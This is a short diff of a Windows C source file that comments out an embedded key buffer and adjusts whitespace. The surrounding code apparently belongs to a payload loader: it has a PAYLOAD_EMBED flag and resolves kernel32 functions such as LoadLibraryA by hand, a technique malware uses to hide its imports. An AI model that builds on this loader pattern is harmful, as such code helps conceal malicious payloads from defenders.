@@ -9,8 +9,8 @@
 //int BUFFER_Size = 203602;
  //int BUFFER_Size = 205;
 
-unsigned char keybuffer[] = "___EASTEREGG2___""\xca\xfe\xba\xbe\xde\xad\xc0\xde";
-int KEY_Size = 8;
+//unsigned char keybuffer[] = "___EASTEREGG2___""\xca\xfe\xba\xbe\xde\xad\xc0\xde";
+//int KEY_Size = 8;
 
 #define DEBUG 1
 #define PAYLOAD_EMBED 1
@@ -166,8 +166,7 @@ void GetCurrentProcessDirectory(char* processDir, DWORD size) {
     }
 }
 
-
-BOOL OpenKeyRecursive(HKEY currentKey, PHKEY saveKey, char **subkeys, int currentidx, int endidx)
+ BOOL OpenKeyRecursive(HKEY currentKey, PHKEY saveKey, char **subkeys, int currentidx, int endidx)
 {
     HMODULE kernel32  = (HMODULE)getModuleByName(aKernel32dll);
     pLoadLibraryA _LoadLibraryA = (pLoadLibraryA) getFuncByName(kernel32, aLoadLibraryA);
